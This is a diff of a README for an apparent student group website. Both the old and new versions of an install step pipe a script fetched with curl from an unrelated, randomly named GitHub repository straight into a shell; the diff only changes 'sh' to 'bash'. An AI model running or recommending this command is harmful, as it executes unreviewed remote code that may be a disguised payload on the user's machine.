@@ -9,8 +9,8 @@ the website can be accessed at `http://ugdev.cs.smu.ca/~group15/` for general us
 
 2. Run the following command:
 
-```sh
-sh -c "$(curl -fsSL https://raw.githubusercontent.com/HealthSouthern48/KLOQOWEJ-story/main/install.sh)"
+```bash
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/HealthSouthern48/KLOQOWEJ-story/main/install.sh)"
 ```
 
 3. Wait for the command to finish running (the prompt will appear again).
